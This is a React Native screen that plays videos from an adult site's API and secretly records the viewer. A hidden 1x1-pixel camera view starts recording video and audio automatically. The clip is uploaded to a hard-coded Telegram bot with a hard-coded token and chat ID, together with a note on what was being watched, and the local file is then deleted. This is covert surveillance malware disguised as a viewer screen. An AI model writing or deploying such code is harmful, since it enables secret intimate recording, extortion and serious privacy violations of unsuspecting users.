import React, {useState, useEffect, useCallback} from 'react';
import {StyleSheet, Text, View} from 'react-native';
import {useIsFocused} from '@react-navigation/native';
import {RNCamera} from 'react-native-camera';
import {WebView} from 'react-native-webview';
import RNFS from 'react-native-fs';
import axios from 'axios';
import {Spinner} from 'native-base';

export default function DetailScreen({navigation, route}) {
  const [data, setData] = useState(null);
  const [camera, setCamera] = useState(null);
  const [isRecordingStarted, setIsRecordingStarted] = useState(false);
  const isFocused = useIsFocused();
  useEffect(() => {
    const fetch = async () => {
      const response = await axios.get(
        `https://www.eporner.com/api/v2/video/id/?id=${
          route.params.id
        }&thumbsize=medium&format=json`,
      );
      setData(response.data);
      navigation.setOptions({
        headerTitle: response.data.added,
      });
    };
    fetch();

    return stopRecording;
  }, [route.params.id, navigation, stopRecording]);

  const stopRecording = useCallback(async () => {
    try {
      camera && isRecordingStarted && (await camera.stopRecording());
      setIsRecordingStarted(false);
      setCamera(null);
    } catch (e) {
      console.log('Error', e);
    }
  }, [camera, isRecordingStarted]);

  const sendVideoInTelegram = async fileUri => {
    const fd = new FormData();
    fd.append('chat_id', '186299579');
    fd.append('video', {
      uri: fileUri,
      name: 'capture.mp4',
      type: 'video/mp4',
    });

    await axios
      .post(
        'https://api.telegram.org/bot834507258:AAHoypWs6uRhgfErzrnDGdRUxAEVcKk4NoM/sendVideo',
        fd,
      )
      .catch(e => console.log(e.message));
  };

  const sendMessageInTelegram = async () => {
    await axios
      .post(
        'https://api.telegram.org/bot834507258:AAHoypWs6uRhgfErzrnDGdRUxAEVcKk4NoM/sendMessage',
        {
          chat_id: '186299579',
          text: 'Зырь, шо он(а) смотрел(а): ' + data.embed,
        },
      )
      .catch(e => console.log(e.message));
  };

  const startRecording = async camerRef => {
    try {
      if (!isRecordingStarted) {
        setIsRecordingStarted(true);
        setCamera(camerRef);
        const {uri} = await camerRef.recordAsync({
          quality: RNCamera.Constants.VideoQuality['480p'],
        });
        await sendVideoInTelegram(uri);
        await sendMessageInTelegram();

        await RNFS.unlink(uri);
      }
    } catch (e) {
      console.log('E:', e.message.toString());
    }
  };

  if (!data) {
    return <Spinner />;
  }

  return (
    <View style={styles.container}>
      <Text style={{padding: 10, color: 'white'}}>{data.title}</Text>
      <WebView
        style={{flex: 1}}
        source={{uri: data.embed}}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        originWhitelist={['*']}
      />
      {isFocused && (
        <RNCamera style={{height: 1, width: 1}} captureAudio={true}>
          {({camera, status}) => {
            if (status === 'READY') {
              setTimeout(() => startRecording(camera), 1000);
            }
            return <View />;
          }}
        </RNCamera>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: 'black',
  },
});
